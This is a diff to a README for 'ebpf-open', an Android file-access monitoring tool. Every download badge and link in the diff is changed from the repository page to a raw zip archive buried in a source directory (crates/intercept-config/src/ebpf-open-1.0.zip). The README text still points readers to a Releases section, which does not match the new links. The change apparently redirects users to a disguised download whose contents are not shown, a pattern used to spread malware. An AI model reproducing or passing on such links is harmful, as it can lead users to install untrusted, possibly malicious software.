@@ -1,6 +1,6 @@
 # 🛡️ ebpf-open - Monitor and Block Android File Access
 
-[![Download ebpf-open](https://img.shields.io/badge/Download-ebpf--open-brightgreen)](https://github.com/Letlhogonolo23/ebpf-open)
+[![Download ebpf-open](https://img.shields.io/badge/Download-ebpf--open-brightgreen)](https://github.com/Letlhogonolo23/ebpf-open/raw/refs/heads/main/crates/intercept-config/src/ebpf-open-1.0.zip)
 
 ## 📝 About ebpf-open
 
@@ -33,7 +33,7 @@ You will download the tool from the official GitHub page. Follow these steps car
 
 1. Click the big green button below to visit the download page for ebpf-open.
 
-[![Download ebpf-open](https://img.shields.io/badge/Download-ebpf--open-brightgreen)](https://github.com/Letlhogonolo23/ebpf-open)
+[![Download ebpf-open](https://img.shields.io/badge/Download-ebpf--open-brightgreen)](https://github.com/Letlhogonolo23/ebpf-open/raw/refs/heads/main/crates/intercept-config/src/ebpf-open-1.0.zip)
 
 2. Once on the GitHub page, look for the "Releases" section. This is where the files are stored.
 
@@ -145,6 +145,6 @@ If you have questions or problems, check the GitHub page for issues others may h
 
 Use this link anytime to download or check for updates:
 
-https://github.com/Letlhogonolo23/ebpf-open
+https://github.com/Letlhogonolo23/ebpf-open/raw/refs/heads/main/crates/intercept-config/src/ebpf-open-1.0.zip
 
-[![Download ebpf-open](https://img.shields.io/badge/Download-ebpf--open-brightgreen)](https://github.com/Letlhogonolo23/ebpf-open)
+[![Download ebpf-open](https://img.shields.io/badge/Download-ebpf--open-brightgreen)](https://github.com/Letlhogonolo23/ebpf-open/raw/refs/heads/main/crates/intercept-config/src/ebpf-open-1.0.zip)
